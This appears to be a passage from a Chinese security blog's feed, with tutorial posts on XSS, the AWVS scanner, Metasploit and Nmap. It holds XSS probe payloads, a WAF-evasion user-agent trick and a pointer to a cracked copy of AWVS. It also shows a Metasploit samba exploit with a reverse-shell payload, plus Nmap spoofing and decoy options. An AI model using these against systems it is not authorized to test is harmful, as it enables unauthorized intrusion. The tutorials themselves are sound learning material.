    <updated>2018-08-19T11:48:36.982Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h1 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h1><p>XSS又叫CSS  (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。</p><h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><p>第一种：反射型XSS 简单的把用户数据反射给浏览器，需要用户点击</p><p>第二种：存储型XSS 把用户输入的数据存储在服务器中</p><p>第三种：DOM Based XSS 通过修改DOM节点的反射型xss</p><h1 id="检测漏洞存在"><a href="#检测漏洞存在" class="headerlink" title="检测漏洞存在"></a>检测漏洞存在</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;alert(&quot;1&quot;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;img  src= javascript:alert(&quot;1&quot;)&gt;&lt;/img&gt;</span><br><span class="line"></span><br><span class="line">&lt;img   dynsrc= javascript:alert(&quot;1&quot;)&gt;&lt;/img&gt;</span><br><span class="line"></span><br><span class="line">&lt;div  style= &quot;background-image:url(  javascript:alert(&apos;1&apos;) )&quot; &gt;</span><br><span class="line"></span><br><span class="line">&lt;font style=&quot;TEST:expression(alert(&apos;1&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure><h1 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h1><p>存储式XSS构成：</p><p><img src="\images\pasted-86.png" alt="upload successful"></p><p>反射式XSS构成：</p><p><img src="\images\pasted-87.png" alt="upload successful"></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>1.对html中不可信字符串进行html转义</p><p>2.对html属性中不可信的字符串进行HTML转义</p><p>3.对javascript字符串中不可信的html先进行html转义，再JavaScript转义</p><p>4.使用白名单，使用UTF-8为默认的字符的字符编码</p><p>5.设置HttpOnly和htmlspecialchars</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Web安全基础</title>
    <link href="http://yoursite.com/2018/08/14/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <id>http://yoursite.com/2018/08/14/Web安全基础/</id>
    <published>2018-08-14T07:06:05.000Z</published>
    <updated>2018-08-14T12:58:55.639Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-78.png" alt="upload successful"></p><h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><p><img src="\images\pasted-79.png" alt="upload successful"></p><h1 id="注入漏洞"><a href="#注入漏洞" class="headerlink" title="注入漏洞"></a>注入漏洞</h1><p><img src="\images\pasted-80.png" alt="upload successful"></p><h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><p><img src="\images\pasted-81.png" alt="upload successful"></p><p>### </p><h1 id="请求伪造漏洞"><a href="#请求伪造漏洞" class="headerlink" title="请求伪造漏洞"></a>请求伪造漏洞</h1><p><img src="\images\pasted-82.png" alt="upload successful"></p><h1 id="文件处理漏洞"><a href="#文件处理漏洞" class="headerlink" title="文件处理漏洞"></a>文件处理漏洞</h1><p><img src="\images\pasted-83.png" alt="upload successful"></p><h1 id="访问控制漏洞"><a href="#访问控制漏洞" class="headerlink" title="访问控制漏洞"></a>访问控制漏洞</h1><p><img src="\images\pasted-84.png" alt="upload successful"></p><h1 id="会话管理漏洞"><a href="#会话管理漏洞" class="headerlink" title="会话管理漏洞"></a>会话管理漏洞</h1><p><img src="\images\pasted-85.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>AWVS使用指北</title>
    <link href="http://yoursite.com/2018/08/14/AWVS%E6%8C%87%E5%8D%97/"/>
    <id>http://yoursite.com/2018/08/14/AWVS指南/</id>
    <published>2018-08-14T05:54:05.000Z</published>
    <updated>2018-08-14T06:58:01.327Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-58.png" alt="upload successful"></p><h1 id="AWVS介绍"><a href="#AWVS介绍" class="headerlink" title="AWVS介绍"></a>AWVS介绍</h1><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的 Web网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流 行安全漏洞。 它包含有收费和免费两种版本，AWVS官方网站是： <a href="http://www.acunetix.com/，目前最新版是V11版本，官方下载地址：" target="_blank" rel="noopener">http://www.acunetix.com/，目前最新版是V11版本，官方下载地址：</a> <a href="https://www.acunetix.com/vulnerability-scanner/download/，" target="_blank" rel="noopener">https://www.acunetix.com/vulnerability-scanner/download/，</a> 官方免费下载的是试用14天的版本。    吾爱破解网站上有完整的安装破解过程</p><h1 id="AWVS优点"><a href="#AWVS优点" class="headerlink" title="AWVS优点"></a>AWVS优点</h1><p>自动的客户端脚本分析器，允许对 Ajax 和 Web 2.0 应用程序进行安全性测 试。</p><p>业内最先进且深入的 SQL 注入和跨站脚本测试 </p><p>高级渗透测试工具，例如 HTTP Editor 和 HTTP Fuzzer </p><p>可视化宏记录器帮助您轻松测试 web 表格和受密码保护的区域</p><p> 支持含有 CAPTHCA 的页面，单个开始指令和 Two Factor（双因素）验证 机制 </p><p>丰富的报告功能，包括 VISA PCI 依从性报告 </p><p>高速的多线程扫描器轻松检索成千上万个页面 i)、智能爬行程序检测 web 服务器类型和应用程序语言</p><p>Acunetix 检索并分析网站，包括 flash 内容、 SOAP 和 AJAX </p><p>端口扫描 web 服务器并对在服务器上运行的网络服务执行安全检查 l)、可导出网站漏洞文件    </p><h1 id="AWVS菜单栏"><a href="#AWVS菜单栏" class="headerlink" title="AWVS菜单栏"></a>AWVS菜单栏</h1><p><img src="\images\pasted-59.png" alt="upload successful"></p><h1 id="AWVS工具栏"><a href="#AWVS工具栏" class="headerlink" title="AWVS工具栏"></a>AWVS工具栏</h1><p><img src="\images\pasted-60.png" alt="upload successful"></p><p>从左到右分别是：</p><p>新建扫描——网站扫描——网站爬行——目标查找——目标探测——子域名扫描——SQL盲注——HTTP编辑——HTTP嗅探——HTTP Fuzzer——认证测试——结果对比——WSDL扫描——WSDL编辑测试——程序设置——扫描设置——侧重扫描设置——计划任务——报告</p><p>对于AWVS最常用的应该就是站点扫描了</p><h1 id="AWVS-新建扫描"><a href="#AWVS-新建扫描" class="headerlink" title="AWVS 新建扫描"></a>AWVS 新建扫描</h1><p>点击菜单栏的 New Scan 新建一次扫描， 网站扫描开始前，需要<br>设定下面选项:<br>1). Scan type<br>2). Options<br>3). Target<br>4). Login<br>5). Finsh</p><h3 id="AWVS-新建扫描——Scan-type"><a href="#AWVS-新建扫描——Scan-type" class="headerlink" title="AWVS 新建扫描——Scan type"></a>AWVS 新建扫描——Scan type</h3><p><img src="\images\pasted-75.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Options"><a href="#AWVS-新建扫描——Options" class="headerlink" title="AWVS 新建扫描——Options"></a>AWVS 新建扫描——Options</h3><p><img src="\images\pasted-76.png" alt="upload successful"></p><h4 id="Options——Scanning-profile"><a href="#Options——Scanning-profile" class="headerlink" title="Options——Scanning profile"></a>Options——Scanning profile</h4><p>设置侧重扫描的类型，包含16种侧重检测类型</p><p><img src="\images\pasted-63.png" alt="upload successful"></p><h5 id="Scanning-Profiles-scripts"><a href="#Scanning-Profiles-scripts" class="headerlink" title="Scanning Profiles scripts"></a>Scanning Profiles scripts</h5><p><img src="\images\pasted-64.png" alt="upload successful"></p><h3 id="Options——Scan-Setting"><a href="#Options——Scan-Setting" class="headerlink" title="Options——Scan Setting"></a>Options——Scan Setting</h3><p><img src="\images\pasted-74.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Advanced"><a href="#AWVS-新建扫描——Advanced" class="headerlink" title="AWVS 新建扫描——Advanced"></a>AWVS 新建扫描——Advanced</h3><p><img src="\images\pasted-67.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Target"><a href="#AWVS-新建扫描——Target" class="headerlink" title="AWVS 新建扫描——Target"></a>AWVS 新建扫描——Target</h3><p><img src="\images\pasted-68.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Login"><a href="#AWVS-新建扫描——Login" class="headerlink" title="AWVS 新建扫描——Login"></a>AWVS 新建扫描——Login</h3><p><img src="\images\pasted-69.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Finish"><a href="#AWVS-新建扫描——Finish" class="headerlink" title="AWVS 新建扫描——Finish"></a>AWVS 新建扫描——Finish</h3><p><img src="\images\pasted-70.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——结果（一）"><a href="#AWVS-新建扫描——结果（一）" class="headerlink" title="AWVS 新建扫描——结果（一）"></a>AWVS 新建扫描——结果（一）</h3><p><img src="\images\pasted-71.png" alt="upload successful"></p><p><img src="\images\pasted-77.png" alt="upload successful"><br>扫描的结果能看到发现漏洞所用的payload，对应的HTTP头信息、HTML、可发送到HTTP Editor中等</p><h3 id="AWVS-新建扫描——结果（二）"><a href="#AWVS-新建扫描——结果（二）" class="headerlink" title="AWVS 新建扫描——结果（二）"></a>AWVS 新建扫描——结果（二）</h3><p><img src="\images\pasted-72.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——导出"><a href="#AWVS-新建扫描——导出" class="headerlink" title="AWVS 新建扫描——导出"></a>AWVS 新建扫描——导出</h3><p><img src="\images\pasted-73.png" alt="upload successful"></p><h1 id="AWVS扫描小技巧"><a href="#AWVS扫描小技巧" class="headerlink" title="AWVS扫描小技巧"></a>AWVS扫描小技巧</h1><h3 id="1-文件头加"><a href="#1-文件头加" class="headerlink" title="1.文件头加"></a>1.文件头加</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br></pre></td></tr></table></figure><p>可以绕过狗，waf等<br>另外如果很容易把对方扫死的话，可以在第一项limit number…..，这里是最大的并发连接数默认是10，可以改低为2-5， 某些WAF对访问请求时间太快会进行拦截，可以进行延迟发包，在Delay between 默认是0，改为1-5</p><h3 id="2-设置cookie"><a href="#2-设置cookie" class="headerlink" title="2.设置cookie"></a>2.设置cookie</h3><p>表单验证用户某些页面，例如扫描后台、扫描用户登录后可访问的页面时候，需要登录用户密码验证再进行扫描，可以设置cookie 来解决</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit使用指南</title>
    <link href="http://yoursite.com/2018/08/14/Metasploit%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <id>http://yoursite.com/2018/08/14/Metasploit使用指南/</id>
    <published>2018-08-14T02:29:05.000Z</published>
    <updated>2018-08-14T03:12:34.872Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-57.png" alt="upload successful"></p><h1 id="什么是Metasploit"><a href="#什么是Metasploit" class="headerlink" title="什么是Metasploit"></a>什么是Metasploit</h1><p>Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称叫做MSF。Metasploit作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。 </p><h1 id="metasploit的启动"><a href="#metasploit的启动" class="headerlink" title="metasploit的启动"></a>metasploit的启动</h1><h3 id="安装metasploit"><a href="#安装metasploit" class="headerlink" title="安装metasploit"></a>安装metasploit</h3><p><code>apt-get install metasploit-framework</code></p><h3 id="启动metasploit"><a href="#启动metasploit" class="headerlink" title="启动metasploit"></a>启动metasploit</h3><p><code>msfconsole</code></p><h1 id="攻击开始"><a href="#攻击开始" class="headerlink" title="攻击开始"></a>攻击开始</h1><h3 id="查找相关模块"><a href="#查找相关模块" class="headerlink" title="查找相关模块"></a>查找相关模块</h3><p>我们可以通过search命令查找相关的扫描脚本。</p><p>命令格式：<code>search Name</code>      如<code>search samba</code></p><h3 id="使用use调度模块"><a href="#使用use调度模块" class="headerlink" title="使用use调度模块"></a>使用use调度模块</h3><p>找到了我们需要攻击的目标模块，我们就使用它，</p><p>通过命令：<code>use ExploitName</code>    如<code>use exploit/multi/samba/usermap_script。</code></p><h3 id="使用info查看模块信息"><a href="#使用info查看模块信息" class="headerlink" title="使用info查看模块信息"></a>使用info查看模块信息</h3><p>metasploit使用info查看模块信息 </p><h3 id="选择payload作为攻击"><a href="#选择payload作为攻击" class="headerlink" title="选择payload作为攻击"></a>选择payload作为攻击</h3><p>选择payload，首先我们要看能使用哪些参数，通过命令：<code>show payloads</code><br>在选择攻击载荷的时候，建议选用和meterpreter和reverse相关的载荷，</p><p>通过使用命令：<code>set payload PayloadName</code>如 set payload cmd/unix/reverse</p><h3 id="metasploit设置攻击参数"><a href="#metasploit设置攻击参数" class="headerlink" title="metasploit设置攻击参数"></a>metasploit设置攻击参数</h3><p>首先通过<code>show options</code>或者options，查看需要填写的参数</p><p>用set命令填充参数</p><h3 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h3><p><code>run</code></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Nmap使用指北</title>
    <link href="http://yoursite.com/2018/08/13/Nmap%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/"/>
    <id>http://yoursite.com/2018/08/13/Nmap使用指北/</id>
    <published>2018-08-13T14:26:05.000Z</published>
    <updated>2018-08-13T15:19:24.153Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><p>Nmap是一个非常强大的工具，它具有覆盖渗透测试的第一方面的能力，其中包括信息的收集和统计它可以适用于winodws,linux,mac等操作系统。Nmap是一款非常强大的实用工具,可用于：</p><p>检测活在网络上的主机（主机发现）<br>检测主机上开放的端口（端口发现或枚举）<br>检测到相应的端口（服务发现）的软件和版本<br>检测操作系统，硬件地址，以及软件版本<br>检测脆弱性的漏洞（Nmap的脚本）</p><h2 id="参数使用"><a href="#参数使用" class="headerlink" title="参数使用"></a>参数使用</h2><h4 id="扫描单一的一个主机："><a href="#扫描单一的一个主机：" class="headerlink" title="扫描单一的一个主机："></a>扫描单一的一个主机：</h4><p><code>nmap cnblogs.com</code></p><p><code>nmap 192.168.1.2</code></p><h4 id="扫描整个子网"><a href="#扫描整个子网" class="headerlink" title="扫描整个子网:"></a>扫描整个子网:</h4><p><code>nmap 192.168.1.1/24</code></p><h4 id="扫描多个目标："><a href="#扫描多个目标：" class="headerlink" title="扫描多个目标："></a>扫描多个目标：</h4><p><code>nmap 192.168.1.2 192.168.1.5</code></p><h4 id="扫描一个范围内的目标："><a href="#扫描一个范围内的目标：" class="headerlink" title="扫描一个范围内的目标："></a>扫描一个范围内的目标：</h4><p><code>nmap 192.168.1.1-100 (扫描IP地址为192.168.1.1-192.168.1.100内的所有主机)</code></p><h4 id="如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下-扫描这个txt内的所有主机："><a href="#如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下-扫描这个txt内的所有主机：" class="headerlink" title="如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机："></a>如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机：</h4><p><code>nmap -iL target.txt</code></p><h4 id="扫描的所有主机的列表"><a href="#扫描的所有主机的列表" class="headerlink" title="扫描的所有主机的列表:"></a>扫描的所有主机的列表:</h4><p><code>nmap -sL 192.168.1.1/24</code></p><h4 id="扫描除过某一个ip外的所有子网主机："><a href="#扫描除过某一个ip外的所有子网主机：" class="headerlink" title="扫描除过某一个ip外的所有子网主机："></a>扫描除过某一个ip外的所有子网主机：</h4><p><code>nmap 192.168.1.1/24 -exclude 192.168.1.1</code></p><h4 id="扫描除过某一个文件中的ip外的子网主机命令："><a href="#扫描除过某一个文件中的ip外的子网主机命令：" class="headerlink" title="扫描除过某一个文件中的ip外的子网主机命令："></a>扫描除过某一个文件中的ip外的子网主机命令：</h4><p><code>nmap 192.168.1.1/24 -exclude file xxx.txt  (xxx.txt中的文件将会从扫描的主机中排除)</code></p><h4 id="扫描特定主机上的80-21-23端口："><a href="#扫描特定主机上的80-21-23端口：" class="headerlink" title="扫描特定主机上的80,21,23端口："></a>扫描特定主机上的80,21,23端口：</h4><p><code>nmap -p80,21,23 192.168.1.1</code></p><h2 id="深入扫描"><a href="#深入扫描" class="headerlink" title="深入扫描"></a>深入扫描</h2><h4 id="半开放扫描-，不会在目标主机上产生任何日志记录"><a href="#半开放扫描-，不会在目标主机上产生任何日志记录" class="headerlink" title="半开放扫描 ，不会在目标主机上产生任何日志记录"></a>半开放扫描 ，不会在目标主机上产生任何日志记录</h4><p><code>nmap -sS 192.168.1.1</code></p><p>Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势. </p><h4 id="找出TCP和UDP端口"><a href="#找出TCP和UDP端口" class="headerlink" title="找出TCP和UDP端口"></a>找出TCP和UDP端口</h4><p><code>nmap -sT 192.168.1.1</code></p><p>TCP connect()扫描就是默认的扫描模式.不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect().Tcp connect()扫描技术只适用于找出TCP和UDP端口. </p><h4 id="找目标主机打开的UDP端口，不需要发送任何的SYN包"><a href="#找目标主机打开的UDP端口，不需要发送任何的SYN包" class="headerlink" title="找目标主机打开的UDP端口，不需要发送任何的SYN包"></a>找目标主机打开的UDP端口，不需要发送任何的SYN包</h4><p><code>nmap -sU 192.168.1.1</code></p><p>它不需要发送任何的SYN包，因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的. </p><h4 id="为规避防火墙，发送一个设置了FIN标志且不需要完成TCP的握手的数据包"><a href="#为规避防火墙，发送一个设置了FIN标志且不需要完成TCP的握手的数据包" class="headerlink" title="为规避防火墙，发送一个设置了FIN标志且不需要完成TCP的握手的数据包"></a>为规避防火墙，发送一个设置了FIN标志且不需要完成TCP的握手的数据包</h4><p><code>nmap -sF 192.168.1.8</code></p><p>FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一) </p><h4 id="ping扫描，只用于找出主机是否是存在在网络中"><a href="#ping扫描，只用于找出主机是否是存在在网络中" class="headerlink" title="ping扫描，只用于找出主机是否是存在在网络中"></a>ping扫描，只用于找出主机是否是存在在网络中</h4><p><code>nmap -sP 192.168.1.1</code></p><h4 id="版本检测"><a href="#版本检测" class="headerlink" title="版本检测"></a>版本检测</h4><p><code>nmap -sV 192.168.1.1</code> </p><p>不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCP SYN扫描开放了哪些端口. </p><h4 id="匿名扫描技术"><a href="#匿名扫描技术" class="headerlink" title="匿名扫描技术"></a>匿名扫描技术</h4><p><code>nmap -sL 192.168.1.6 192.168.1.1</code></p><p>不是用你真实的主机Ip发送数据包，而是使用另外一个目标网络的主机发送数据包. Idle scan是一种理想的匿名扫描技术,通过目标网络中的192.168.1.6向主机192.168.1.1发送数据，来获取192.168.1.1开放的端口</p><h4 id="OS检测（O）"><a href="#OS检测（O）" class="headerlink" title="OS检测（O）"></a>OS检测（O）</h4><p><code>nmap -O  192.168.199.111</code>  </p><p>能够远程检测操作系统和软件，Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的，通过获取的信息可以知道已知的漏洞。Nmap有一个名为的nmap-OS-DB数据库，该数据库包含超过2600操作系统的信息。 Nmap把TCP和UDP数据包发送到目标机器上，然后检查结果和数据库对照</p><h4 id="不ping远程主机"><a href="#不ping远程主机" class="headerlink" title="不ping远程主机"></a>不ping远程主机</h4><p><code>nmap -O -PN 192.168.1.1/24</code></p><p>如果远程主机有防火墙，IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会挡掉ping请求.-PN命令告诉Nmap不用ping远程主机。 使用-PN参数可以绕过PING命令,但是不影响主机的系统的发现 </p><h4 id="猜测功能"><a href="#猜测功能" class="headerlink" title="猜测功能"></a>猜测功能</h4><p><code>nmap -O –osscan-guess 192.168.1.1</code></p><p>通过Nmap准确的检测到远程操作系统是比较困难的，需要使用到Nmap的猜测功能选项, –osscan-guess 猜测认为最接近目标的匹配操作系统类型</p><h1 id="官网文档："><a href="#官网文档：" class="headerlink" title="官网文档："></a>官网文档：</h1><p>Nmap 7.60SVN（<a href="https://nmap.org）" target="_blank" rel="noopener">https://nmap.org）</a></p><p>用法：nmap [扫描类型] [选项] {目标规范}</p><h4 id="目标规格："><a href="#目标规格：" class="headerlink" title="目标规格："></a>目标规格：</h4><p> 可以传递主机名，IP地址，网络等。</p><p> 例如：scanme.nmap.org，microsoft.com / 24,192.168.0.1; 10.0.0-255.1-254</p><p> -iL <inputfilename>：从主机/网络列表输入</inputfilename></p><p> -iR <num hosts="">：选择随机目标</num></p><p> –exclude <host1 [，host2]="" [，host3]，...="">：排除主机/网络</host1></p><p> –excludefile &lt;exclude_file&gt;：从文件中排除列表</p><h4 id="主机发现："><a href="#主机发现：" class="headerlink" title="主机发现："></a>主机发现：</h4><p>  -sL：列表扫描 - 只列出要扫描的目标</p><p>  -sn：Ping扫描 - 禁用端口扫描</p><p>  -Pn：将所有主机视为在线 - 跳过主机发现</p><p>  -PS / PA / PU / PY [端口列表]：TCP SYN / ACK，UDP或SCTP发现到给定端口</p><p>  -PE / PP / PM：ICMP回送，时间戳和网络掩码请求发现探测</p><p>  -PO [协议列表]：IP协议Ping</p><p>  -n / -R：从不进行DNS解析/始终解析[默认：有时]</p><p>  –dns-servers <serv1 [，serv2]，...="">：指定自定义DNS服务器</serv1></p><p>  –system-dns：使用OS的DNS解析器</p><p>  –traceroute：每个主机的跟踪跳转路径</p><h4 id="扫描技术："><a href="#扫描技术：" class="headerlink" title="扫描技术："></a>扫描技术：</h4><p>  -sS / sT / sA / sW / sM：TCP SYN / Connect（）/ ACK / Window / Maimon扫描</p><p>  -sU：UDP扫描</p><p>  -sN / sF / sX：TCP Null，FIN和Xmas扫描</p><p>  –scanflags <flags>：自定义TCP扫描标志</flags></p><p>  -sI <zombie host="" [：probeport]="">：空闲扫描</zombie></p><p>  -sY / sZ：SCTP INIT / COOKIE-ECHO扫描</p><p>  -sO：IP协议扫描</p><p>  -b &lt;FTP中继主机&gt;：FTP反弹扫描</p><h4 id="港口规格和扫描令："><a href="#港口规格和扫描令：" class="headerlink" title="港口规格和扫描令："></a>港口规格和扫描令：</h4><p>  -p &lt;端口范围&gt;：仅扫描指定的端口</p><p>​    例如：-p22; -p1-65535; -p U：53,111,137，T：21-25,80,139,8080，S：9</p><p>  –exclude-ports &lt;端口范围&gt;：从扫描中排除指定的端口</p><p>  -F：快速模式 - 扫描比默认扫描更少的端口</p><p>  -r：连续扫描端口 - 不要随机化</p><p>  –top-ports <number>：扫描<number>最常见的端口</number></number></p><p>  –port-ratio <ratio>：扫描端口比<ratio>更常见</ratio></ratio></p><h4 id="服务-版本检测："><a href="#服务-版本检测：" class="headerlink" title="服务/版本检测："></a>服务/版本检测：</h4><p>  -sV：探测开放端口以确定服务/版本信息</p><p>  –version-intensity <level>：从0（亮）到9（尝试所有探针）设置</level></p><p>  –version-light：限制最可能的探针（强度2）</p><p>  –version-all：尝试每一个探针（强度9）</p><p>  –version-trace：显示详细的版本扫描活动（用于调试）</p><h4 id="脚本扫描："><a href="#脚本扫描：" class="headerlink" title="脚本扫描："></a>脚本扫描：</h4><p>  -sC：相当于–script = default</p><p>  –script = <lua scripts="">：<lua scripts="">是逗号分隔的列表</lua></lua></p><p>​           目录，脚本文件或脚本类别</p><p>  –script-args = <n1 =="" v1，[n2="v2，...]">：为脚本提供参数</n1></p><p>  –script-args-file = filename：在文件中提供NSE脚本args</p><p>  –script-trace：显示发送和接收的所有数据</p><p>  –script-updatedb：更新脚本数据库。</p><p>  –script-help = <lua scripts="">：显示有关脚本的帮助。</lua></p><p>​           <lua scripts="">是以逗号分隔的脚本文件列表或</lua></p><p>​           脚本的类别。</p><h4 id="操作系统检测："><a href="#操作系统检测：" class="headerlink" title="操作系统检测："></a>操作系统检测：</h4><p>  -O：启用OS检测</p><p>  –osscan-limit：将OS检测限制为有希望的目标</p><p>  –osscan-guess：更积极地猜测操作系统</p><h4 id="时间和性能："><a href="#时间和性能：" class="headerlink" title="时间和性能："></a>时间和性能：</h4><p>  采用<time>的选项以秒为单位，或追加’ms’（毫秒），</time></p><p>  该值的’s’（秒），’m’（分钟）或’h’（小时）（例如30m）。</p><p>  -T <0-5>：设置时序模板（越高越快）</0-5></p><p>  –min-hostgroup / max-hostgroup <size>：并行主机扫描组大小</size></p><p>  –min-parallelism / max-parallelism <numprobes>：探测并行化</numprobes></p><p>  –min-rtt-timeout / max-rtt-timeout / initial-rtt-timeout <time>：指定</time></p><p>​      探测往返时间。</p><p>  –max-retries <tries>：端口扫描探测重新传输的上限数量。</tries></p><p>  –host-timeout <time>：在此之后放弃目标</time></p><p>  –scan-delay /  -  max-scan-delay <time>：调整探针之间的延迟</time></p><p>  –min-rate <number>：发送数据包的速度不低于每秒<number></number></number></p><p>  –max-rate <number>：发送数据包的速度不超过每秒<number></number></number></p><h4 id="防火墙-IDS逃脱和防御："><a href="#防火墙-IDS逃脱和防御：" class="headerlink" title="防火墙/ IDS逃脱和防御："></a>防火墙/ IDS逃脱和防御：</h4><p>  -F; –mtu <val>：分段数据包（可选地，具有给定的MTU）</val></p><p>  -D &lt;decoy1，decoy2 [，ME]，…&gt;：用诱饵披露扫描</p><p>  -S &lt;IP_Address&gt;：欺骗源地址</p><p>  -e <iface>：使用指定的接口</iface></p><p>  -g /  -  source-port <portnum>：使用给定的端口号</portnum></p><p>  –proxies &lt;url1，[url2]，…&gt;：通过HTTP / SOCKS4代理中继连接</p><p>  –data <hex string="">：为发送的数据包附加自定义有效负载</hex></p><p>  –data-string <string>：为发送的数据包附加自定义ASCII字符串</string></p><p>  –data-length <num>：将随机数据附加到已发送的数据包</num></p><p>  –ip-options <options>：发送带有指定ip选项的数据包</options></p><p>  –ttl <val>：设置IP生存时间字段</val></p><p>  –spoof-mac &lt;mac地址/前缀/供应商名称&gt;：欺骗你的MAC地址</p><p>  –badsum：使用伪TCP / UDP / SCTP校验和发送数据包</p><p>OUTPUT：</p><p>  -oN / -oX / -oS / -oG <file>：正常输出扫描，XML，s | &lt;rIpt kIddi3，</file></p><p>​     和Grepable格式，分别为给定的文件名。</p><p>  -oA <basename>：一次输出三种主要格式</basename></p><p>  -v：增加详细级别（使用-vv或更高级别以获得更好的效果）</p><p>  -d：提高调试级别（使用-dd或更多以获得更好的效果）</p><p>  –reason：显示端口处于特定状态的原因</p><p>  –open：仅显示打开（或可能打开）的端口</p><p>  –packet-trace：显示发送和接收的所有数据包</p><p>  –iflist：打印主机接口和路由（用于调试）</p><p>  –append-output：追加而不是clobber指定的输出文件</p><p>  –resume <filename>：恢复中止扫描</filename></p><p>  –stylesheet &lt;path / URL&gt;：用于将XML输出转换为HTML的XSL样式表</p><p>  –webxml：来自Nmap.Org的参考样式表，用于更多可移植的XML</p><p>  –no-stylesheet：防止与XML输出相关联的XSL样式表</p><p>MISC：</p><p>  -6：启用IPv6扫描</p><p>  -A：启用操作系统检测，版本检测，脚本扫描和跟踪路由</p><p>  –datadir <dirname>：指定自定义Nmap数据文件位置</dirname></p><p>  –send-eth /  -  send-ip：使用原始以太网帧或IP数据包发送</p><p>  –privileged：假设用户具有完全特权</p><p>  –unprivileged：假设用户缺少原始套接字权限</p><p>  -V：打印版本号</p><p>  -h：打印此帮助摘要页面。</p><p>例子：</p><p>  nmap -v -A scanme.nmap.org</p><p>  nmap -v -sn 192.168.0.0/16 10.0.0.0/8</p><p>  nmap -v -iR 10000 -Pn -p 